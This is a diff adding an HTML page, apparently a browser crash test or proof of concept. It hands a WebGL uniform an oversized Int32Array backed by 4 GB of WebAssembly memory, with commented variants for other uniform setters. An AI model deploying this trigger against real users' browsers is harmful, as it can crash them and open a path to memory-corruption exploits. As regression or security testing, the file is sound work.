@@ -1,0 +1,59 @@
+<html>
+  <body>
+    <canvas id='canvas'></canvas>
+    <script type="x-shader/x-vertex" id="vertex">
+#version 100
+uniform mat4 overflow;
+
+void main() {
+  gl_Position = overflow * vec4(0.11, 0.22, 0.33, 1.0);
+}
+    </script>
+    <script type="x-shader/x-fragment" id="fragment">
+#version 100
+void main() {
+  gl_FragColor = vec4(0.11, 0.22, 0.33, 1.0);
+}
+    </script>
+    <script>
+async function trigger() {
+  let canvas = document.getElementById('canvas');
+  let gl = canvas.getContext('webgl');
+
+  let vertex_shader = gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vertex_shader, document.querySelector("#vertex").innerHTML);
+  gl.compileShader(vertex_shader);
+
+  let fragment_shader = gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fragment_shader, document.querySelector("#fragment").innerHTML);
+  gl.compileShader(fragment_shader);
+
+  program = gl.createProgram();
+  gl.attachShader(program, vertex_shader);
+  gl.attachShader(program, fragment_shader);
+  gl.linkProgram(program);
+
+  overflow = gl.getUniformLocation(program, "overflow");
+    
+  gl.useProgram(program);
+
+  let array = new Int32Array(new WebAssembly.Memory({initial: 65536}).buffer, 4);
+  //array.fill(0x23);
+
+  gl.uniform1iv(overflow, array);
+
+  //gl.uniform2iv(overflow, new Int32Array(new WebAssembly.Memory({initial: 65536}).buffer, 8));
+  //gl.uniform3iv(overflow, new Int32Array(new WebAssembly.Memory({initial: 65536}).buffer, 4));
+  //gl.uniform1fv(overflow, new Float32Array(new WebAssembly.Memory({initial: 65536}).buffer, 4));
+  //gl.uniform2fv(overflow, new Float32Array(new WebAssembly.Memory({initial: 65536}).buffer, 8));
+  //gl.uniform3fv(overflow, new Float32Array(new WebAssembly.Memory({initial: 65536}).buffer, 4));
+}
+setTimeout(trigger, 100);
+setTimeout(()=>{
+  const img = document.createElement("img");
+  img.src = "https://i.ytimg.com/vi/rPleicjySdI/maxresdefault.jpg";
+  document.body.append(img);
+}, 500)
+    </script>
+  </body>
+</html>
